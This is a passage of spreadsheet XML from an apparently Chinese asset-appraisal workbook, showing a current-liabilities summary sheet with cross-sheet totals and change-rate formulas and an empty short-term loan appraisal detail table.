        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="347" t="n"/>
      <c r="J10" s="347" t="n"/>
      <c r="K10" s="347" t="n"/>
      <c r="L10" s="156" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B11" s="284" t="inlineStr">
        <is>
          <t>5-6</t>
        </is>
      </c>
      <c r="C11" s="397" t="inlineStr">
        <is>
          <t>预收账款</t>
        </is>
      </c>
      <c r="D11" s="327" t="inlineStr">
        <is>
          <t>预收款项</t>
        </is>
      </c>
      <c r="E11" s="560">
        <f>'5-6预收款项'!I28</f>
        <v/>
      </c>
      <c r="F11" s="560">
        <f>'5-6预收款项'!J28</f>
        <v/>
      </c>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="615">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
      <c r="I11" s="347" t="n"/>
      <c r="J11" s="347" t="n"/>
      <c r="K11" s="347" t="n"/>
      <c r="L11" s="156" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B12" s="284" t="inlineStr">
        <is>
          <t>5-7</t>
        </is>
      </c>
      <c r="C12" s="397" t="inlineStr">
        <is>
          <t>合同负债</t>
        </is>
      </c>
      <c r="D12" s="157" t="inlineStr">
        <is>
          <t>合同负债</t>
        </is>
      </c>
      <c r="E12" s="560">
        <f>'5-7合同负债'!F28</f>
        <v/>
      </c>
      <c r="F12" s="560">
        <f>'5-7合同负债'!G28</f>
        <v/>
      </c>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="615">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
      <c r="I12" s="347" t="n"/>
      <c r="J12" s="347" t="n"/>
      <c r="K12" s="347" t="n"/>
      <c r="L12" s="156" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B13" s="284" t="inlineStr">
        <is>
          <t>5-8</t>
        </is>
      </c>
      <c r="C13" s="397" t="inlineStr">
        <is>
          <t>应付薪酬</t>
        </is>
      </c>
      <c r="D13" s="327" t="inlineStr">
        <is>
          <t>应付职工薪酬</t>
        </is>
      </c>
      <c r="E13" s="560">
        <f>'5-8应付职工薪酬'!E26</f>
        <v/>
      </c>
      <c r="F13" s="560">
        <f>'5-8应付职工薪酬'!F26</f>
        <v/>
      </c>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="615">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
      <c r="I13" s="347" t="n"/>
      <c r="J13" s="347" t="n"/>
      <c r="K13" s="347" t="n"/>
      <c r="L13" s="156" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B14" s="284" t="inlineStr">
        <is>
          <t>5-9</t>
        </is>
      </c>
      <c r="C14" s="397" t="inlineStr">
        <is>
          <t>应交税费</t>
        </is>
      </c>
      <c r="D14" s="327" t="inlineStr">
        <is>
          <t>应交税费</t>
        </is>
      </c>
      <c r="E14" s="560">
        <f>'5-9应交税费'!F27</f>
        <v/>
      </c>
      <c r="F14" s="560">
        <f>'5-9应交税费'!G27</f>
        <v/>
      </c>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="615">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
      <c r="I14" s="347" t="n"/>
      <c r="J14" s="347" t="n"/>
      <c r="K14" s="347" t="n"/>
      <c r="L14" s="156" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B15" s="284" t="inlineStr">
        <is>
          <t>5-10</t>
        </is>
      </c>
      <c r="C15" s="91" t="inlineStr">
        <is>
          <t>其付汇总</t>
        </is>
      </c>
      <c r="D15" s="327" t="inlineStr">
        <is>
          <t>其他应付款</t>
        </is>
      </c>
      <c r="E15" s="560">
        <f>'5-10其他应付款汇总表'!E26</f>
        <v/>
      </c>
      <c r="F15" s="560">
        <f>'5-10其他应付款汇总表'!F26</f>
        <v/>
      </c>
      <c r="G15" s="555">
        <f>F15-E15</f>
        <v/>
      </c>
      <c r="H15" s="615">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
      <c r="I15" s="347" t="n"/>
      <c r="J15" s="347" t="n"/>
      <c r="K15" s="347" t="n"/>
      <c r="L15" s="156" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B16" s="284" t="inlineStr">
        <is>
          <t>5-11</t>
        </is>
      </c>
      <c r="C16" s="91" t="inlineStr">
        <is>
          <t>持有待债</t>
        </is>
      </c>
      <c r="D16" s="157" t="inlineStr">
        <is>
          <t>持有待售负债</t>
        </is>
      </c>
      <c r="E16" s="560">
        <f>'5-11持有待售负债'!F27</f>
        <v/>
      </c>
      <c r="F16" s="560">
        <f>'5-11持有待售负债'!G27</f>
        <v/>
      </c>
      <c r="G16" s="555">
        <f>F16-E16</f>
        <v/>
      </c>
      <c r="H16" s="615">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
      <c r="I16" s="347" t="n"/>
      <c r="J16" s="347" t="n"/>
      <c r="K16" s="347" t="n"/>
      <c r="L16" s="156" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B17" s="284" t="inlineStr">
        <is>
          <t>5-12</t>
        </is>
      </c>
      <c r="C17" s="307" t="inlineStr">
        <is>
          <t>到期非债</t>
        </is>
      </c>
      <c r="D17" s="327" t="inlineStr">
        <is>
          <t>一年内到期的非流动负债</t>
        </is>
      </c>
      <c r="E17" s="560">
        <f>'5-12一年到期非流动负债'!J28</f>
        <v/>
      </c>
      <c r="F17" s="560">
        <f>'5-12一年到期非流动负债'!K28</f>
        <v/>
      </c>
      <c r="G17" s="555">
        <f>F17-E17</f>
        <v/>
      </c>
      <c r="H17" s="615">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
      <c r="I17" s="347" t="n"/>
      <c r="J17" s="347" t="n"/>
      <c r="K17" s="347" t="n"/>
      <c r="L17" s="156" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B18" s="284" t="inlineStr">
        <is>
          <t>5-13</t>
        </is>
      </c>
      <c r="C18" s="307" t="inlineStr">
        <is>
          <t>其他流债</t>
        </is>
      </c>
      <c r="D18" s="327" t="inlineStr">
        <is>
          <t>其他流动负债</t>
        </is>
      </c>
      <c r="E18" s="560">
        <f>'5-13其他流动负债'!F26</f>
        <v/>
      </c>
      <c r="F18" s="560">
        <f>'5-13其他流动负债'!G26</f>
        <v/>
      </c>
      <c r="G18" s="555">
        <f>F18-E18</f>
        <v/>
      </c>
      <c r="H18" s="615">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
      <c r="I18" s="347" t="n"/>
      <c r="J18" s="347" t="n"/>
      <c r="K18" s="347" t="n"/>
      <c r="L18" s="156" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="307" t="n"/>
      <c r="D19" s="327" t="n"/>
      <c r="E19" s="560" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="615">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
      <c r="I19" s="347" t="n"/>
      <c r="J19" s="347" t="n"/>
      <c r="K19" s="347" t="n"/>
      <c r="L19" s="156" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="307" t="n"/>
      <c r="D20" s="327" t="n"/>
      <c r="E20" s="560" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="615">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
      <c r="I20" s="347" t="n"/>
      <c r="J20" s="347" t="n"/>
      <c r="K20" s="347" t="n"/>
      <c r="L20" s="156" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="307" t="n"/>
      <c r="D21" s="327" t="n"/>
      <c r="E21" s="560" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="615">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
      <c r="I21" s="347" t="n"/>
      <c r="J21" s="347" t="n"/>
      <c r="K21" s="347" t="n"/>
      <c r="L21" s="156" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="307" t="n"/>
      <c r="D22" s="327" t="n"/>
      <c r="E22" s="560" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="615">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
      <c r="I22" s="347" t="n"/>
      <c r="J22" s="347" t="n"/>
      <c r="K22" s="347" t="n"/>
      <c r="L22" s="156" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="307" t="n"/>
      <c r="D23" s="327" t="n"/>
      <c r="E23" s="560" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="615">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="347" t="n"/>
      <c r="J23" s="347" t="n"/>
      <c r="K23" s="347" t="n"/>
      <c r="L23" s="156" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="307" t="n"/>
      <c r="D24" s="327" t="n"/>
      <c r="E24" s="560" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="615">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
      <c r="I24" s="347" t="n"/>
      <c r="J24" s="347" t="n"/>
      <c r="K24" s="347" t="n"/>
      <c r="L24" s="156" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B25" s="284" t="n"/>
      <c r="C25" s="397" t="n"/>
      <c r="D25" s="159" t="n"/>
      <c r="E25" s="560" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="615">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
      <c r="I25" s="347" t="n"/>
      <c r="J25" s="347" t="n"/>
      <c r="K25" s="347" t="n"/>
      <c r="L25" s="156" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B26" s="284" t="n"/>
      <c r="C26" s="397" t="n"/>
      <c r="D26" s="159" t="n"/>
      <c r="E26" s="560" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="615">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
      <c r="I26" s="347" t="n"/>
      <c r="J26" s="347" t="n"/>
      <c r="K26" s="347" t="n"/>
      <c r="L26" s="156" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="145" t="n"/>
      <c r="C27" s="145" t="inlineStr">
        <is>
          <t>流债汇总</t>
        </is>
      </c>
      <c r="D27" s="284" t="inlineStr">
        <is>
          <t>流动负债合计</t>
        </is>
      </c>
      <c r="E27" s="560">
        <f>SUM(E6:E26)</f>
        <v/>
      </c>
      <c r="F27" s="560">
        <f>SUM(F6:F26)</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>F27-E27</f>
        <v/>
      </c>
      <c r="H27" s="615">
        <f>IF(E27=0,"",G27/E27*100)</f>
        <v/>
      </c>
      <c r="I27" s="347" t="n"/>
      <c r="J27" s="347" t="n"/>
      <c r="K27" s="347" t="n"/>
      <c r="L27" s="156" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="B4:E4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83.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet80">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N28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9" customWidth="1" style="410" min="1" max="1"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="27.6666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="4" max="5"/>
    <col width="11.5" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="13" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col width="10.6666666666667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短期借款评估明细表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7.2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547" t="n"/>
      <c r="M3" s="547" t="n"/>
      <c r="N3" s="402" t="inlineStr">
        <is>
          <t>表5-1</t>
        </is>
      </c>
    </row>
    <row r="4" ht="17.2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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="17.2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放款银行（或机构）名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>到期日</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>年利率%</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="I5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="J5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="115" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="580" t="n"/>
      <c r="I6" s="619" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555" t="n"/>
      <c r="L6" s="555">
        <f>K6-J6</f>
        <v/>
      </c>
      <c r="M6" s="555">
        <f>IF(J6=0,"",L6/J6*100)</f>
        <v/>
      </c>
      <c r="N6" s="383" t="n"/>
    </row>
    <row r="7" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="580" t="n"/>
      <c r="I7" s="619" t="n"/>
      <c r="J7" s="580" t="n"/>
      <c r="K7" s="580" t="n"/>
      <c r="L7" s="555">
        <f>K7-J7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(J7=0,"",L7/J7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="580" t="n"/>
      <c r="I8" s="619" t="n"/>
      <c r="J8" s="580" t="n"/>
      <c r="K8" s="580" t="n"/>
      <c r="L8" s="555">
        <f>K8-J8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(J8=0,"",L8/J8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="580" t="n"/>
      <c r="I9" s="619" t="n"/>
      <c r="J9" s="580" t="n"/>
      <c r="K9" s="580" t="n"/>
      <c r="L9" s="555">
        <f>K9-J9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(J9=0,"",L9/J9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="580" t="n"/>
      <c r="I10" s="619" t="n"/>
      <c r="J10" s="580" t="n"/>
      <c r="K10" s="580" t="n"/>
      <c r="L10" s="555">
        <f>K10-J10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(J10=0,"",L10/J10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="580" t="n"/>
      <c r="I11" s="619" t="n"/>
      <c r="J11" s="580" t="n"/>
      <c r="K11" s="580" t="n"/>
      <c r="L11" s="555">
        <f>K11-J11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(J11=0,"",L11/J11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="580" t="n"/>
      <c r="I12" s="619" t="n"/>
      <c r="J12" s="580" t="n"/>
      <c r="K12" s="580" t="n"/>
      <c r="L12" s="555">
        <f>K12-J12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(J12=0,"",L12/J12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="580" t="n"/>
      <c r="I13" s="619" t="n"/>
      <c r="J13" s="580" t="n"/>
      <c r="K13" s="580" t="n"/>
      <c r="L13" s="555">
        <f>K13-J13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(J13=0,"",L13/J13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="580" t="n"/>
      <c r="I14" s="619" t="n"/>
      <c r="J14" s="580" t="n"/>
      <c r="K14" s="580" t="n"/>
      <c r="L14" s="555">
        <f>K14-J14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(J14=0,"",L14/J14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="580" t="n"/>
      <c r="I15" s="619" t="n"/>
      <c r="J15" s="580" t="n"/>
      <c r="K15" s="580" t="n"/>
      <c r="L15" s="555">
        <f>K15-J15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(J15=0,"",L15/J15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="580" t="n"/>
      <c r="I16" s="619" t="n"/>
      <c r="J16" s="580" t="n"/>
      <c r="K16" s="580" t="n"/>
      <c r="L16" s="555">
        <f>K16-J16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(J16=0,"",L16/J16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="580" t="n"/>
      <c r="I17" s="619" t="n"/>
      <c r="J17" s="580" t="n"/>
      <c r="K17" s="580" t="n"/>
      <c r="L17" s="555">
        <f>K17-J17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(J17=0,"",L17/J17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="580" t="n"/>
      <c r="I18" s="619" t="n"/>
      <c r="J18" s="580" t="n"/>
      <c r="K18" s="580" t="n"/>
      <c r="L18" s="555">
        <f>K18-J18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(J18=0,"",L18/J18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="580" t="n"/>
      <c r="I19" s="619" t="n"/>
      <c r="J19" s="580" t="n"/>
      <c r="K19" s="580" t="n"/>
      <c r="L19" s="555">
        <f>K19-J19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(J19=0,"",L19/J19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="580" t="n"/>
      <c r="I20" s="619" t="n"/>
      <c r="J20" s="580" t="n"/>
      <c r="K20" s="580" t="n"/>
      <c r="L20" s="555">
        <f>K20-J20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(J20=0,"",L20/J20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="580" t="n"/>
      <c r="I21" s="619" t="n"/>
      <c r="J21" s="580" t="n"/>
      <c r="K21" s="580" t="n"/>
      <c r="L21" s="555">
        <f>K21-J21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(J21=0,"",L21/J21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="580" t="n"/>
      <c r="I22" s="619" t="n"/>
      <c r="J22" s="580" t="n"/>
      <c r="K22" s="580" t="n"/>
      <c r="L22" s="555">
        <f>K22-J22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(J22=0,"",L22/J22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="580" t="n"/>
      <c r="I23" s="619" t="n"/>
      <c r="J23" s="580" t="n"/>
      <c r="K23" s="580" t="n"/>
      <c r="L23" s="555">
        <f>K23-J23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(J23=0,"",L23/J23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="580" t="n"/>
      <c r="I24" s="619" t="n"/>
      <c r="J24" s="580" t="n"/>
      <c r="K24" s="580" t="n"/>
      <c r="L24" s="555">
        <f>K24-J24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(J24=0,"",L24/J24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="580" t="n"/>
      <c r="I25" s="619" t="n"/>
      <c r="J25" s="580" t="n"/>
      <c r="K25" s="580" t="n"/>
      <c r="L25" s="555">
        <f>K25-J25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(J25=0,"",L25/J25*100)</f>
        <v/>
      </c>
      <c r="N25" s="383" t="n"/>
    </row>
    <row r="26" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="580" t="n"/>
      <c r="I26" s="619" t="n"/>
      <c r="J26" s="580" t="n"/>
      <c r="K26" s="580" t="n"/>
      <c r="L26" s="555">
